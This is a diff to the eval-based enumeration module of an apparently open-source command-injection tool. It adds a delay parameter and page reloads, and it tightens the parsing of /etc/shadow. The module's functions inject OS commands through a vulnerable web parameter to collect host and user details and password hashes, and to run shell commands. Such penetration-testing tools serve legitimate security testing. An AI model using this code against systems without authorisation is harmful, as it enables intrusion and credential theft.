@@ -22,6 +22,8 @@ from src.utils import session_handler
 
 from src.core.injections.controller import checks
 from src.thirdparty.colorama import Fore, Back, Style, init
+
+from src.core.requests import requests
 from src.core.injections.results_based.techniques.eval_based import eb_injector
 
 """
@@ -31,7 +33,7 @@ The "eval-based" code injection technique on classic OS command injection.
 """
 Powershell's version number enumeration (for Windows OS)
 """
-def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename): 
+def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay): 
   cmd = settings.PS_VERSION
   if alter_shell:
     cmd = cmd.replace("'","\\'")
@@ -41,6 +43,9 @@ def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   # Evaluate injection results.
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     ps_version = eb_injector.injection_results(response, TAG, cmd)
     ps_version = "".join(str(p) for p in ps_version).replace(" ", "", 1)[:-1]
@@ -72,12 +77,15 @@ def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_
 """
 Hostname enumeration
 """
-def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):
   if settings.TARGET_OS == "win":
     settings.HOSTNAME = settings.WIN_HOSTNAME 
   cmd = settings.HOSTNAME
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
@@ -99,12 +107,15 @@ def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
 """
 Retrieve system information
 """
-def system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):     
+def system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):     
   if settings.TARGET_OS == "win":
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
   cmd = settings.RECOGNISE_OS        
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     target_os = eb_injector.injection_results(response, TAG, cmd)
     target_os = "".join(str(p) for p in target_os).replace(" ", "", 1)[:-1]
@@ -118,6 +129,9 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
       cmd = settings.RECOGNISE_HP
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+      # Perform target page reload (if it is required).
+      if settings.URL_RELOAD:
+        response = requests.url_reload(url, delay)
       # Evaluate injection results.
       target_arch = eb_injector.injection_results(response, TAG, cmd)
       target_arch = "".join(str(p) for p in target_arch).replace(" ", "", 1)[:-1]
@@ -141,7 +155,7 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
 """
 The current user enumeration
 """
-def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):
   if settings.TARGET_OS == "win":
     settings.SYS_USERS = settings.WIN_SYS_USERS
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
@@ -152,6 +166,9 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
   cmd = settings.CURRENT_USER
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     cu_account = eb_injector.injection_results(response, TAG, cmd)
     cu_account = "".join(str(p) for p in cu_account).replace(" ", "", 1)[:-1]
@@ -169,6 +186,9 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
         cmd = settings.IS_ROOT 
       response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+        # Perform target page reload (if it is required).
+        if settings.URL_RELOAD:
+          response = requests.url_reload(url, delay)
         # Evaluate injection results.
         shell = eb_injector.injection_results(response, TAG, cmd)
         shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
@@ -215,7 +235,7 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
 """
 System users enumeration
 """
-def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename): 
+def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay): 
   if settings.TARGET_OS == "win":
     settings.SYS_USERS = settings.WIN_SYS_USERS
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
@@ -226,6 +246,9 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
   cmd = settings.SYS_USERS             
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     sys_users = eb_injector.injection_results(response, TAG, cmd)
     sys_users = "".join(str(p) for p in sys_users).replace(" ", "", 1)[:-1]
@@ -417,7 +440,7 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
 """
 System passwords enumeration
 """
-def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):     
+def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):     
   if settings.TARGET_OS == "win":
     # Not yet implemented!  
     pass 
@@ -425,6 +448,9 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
     cmd = settings.SYS_PASSES            
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+      # Perform target page reload (if it is required).
+      if settings.URL_RELOAD:
+        response = requests.url_reload(url, delay)
       # Evaluate injection results.
       sys_passes = eb_injector.injection_results(response, TAG, cmd)
       sys_passes = "".join(str(p) for p in sys_passes)
@@ -458,13 +484,14 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
         for line in sys_passes:
           count = count + 1
           try:
-            fields = line.split(":")
-            if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
-              print "  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
-              # Add infos to logs file.   
-              output_file = open(filename, "a")
-              output_file.write("      (" +str(count)+ ") " + fields[0] + " : " + fields[1])
-              output_file.close()
+            if ":" in line:
+              fields = line.split(":")
+              if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
+                print "  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
+                # Add infos to logs file.   
+                output_file = open(filename, "a")
+                output_file.write("      (" +str(count)+ ") " + fields[0] + " : " + fields[1])
+                output_file.close()
           # Check for appropriate '/etc/shadow' format.
           except IndexError:
             if count == 1 :
@@ -485,10 +512,13 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
 """
 Single os-shell execution
 """
-def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):
   cmd =  menu.options.os_cmd
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Perform target page reload (if it is required).
+    if settings.URL_RELOAD:
+      response = requests.url_reload(url, delay)
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
@@ -508,7 +538,7 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_
 """
 Check the defined options
 """
-def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay):
   
   if not settings.VERBOSITY_LEVEL >= 1 and not settings.ENUMERATION_DONE:
     print ""
@@ -518,27 +548,27 @@ def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
     checks.ps_check()
 
   if menu.options.ps_version and settings.TARGET_OS == "win" and settings.PS_ENABLED == None:
-    powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
 
   if menu.options.hostname:
-    hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
     
   if menu.options.current_user:
-    current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
 
   if menu.options.sys_info:
-    system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
 
   if menu.options.users:
-    system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
 
   if menu.options.passwords:
-    system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
     settings.ENUMERATION_DONE = True
 
 # eof
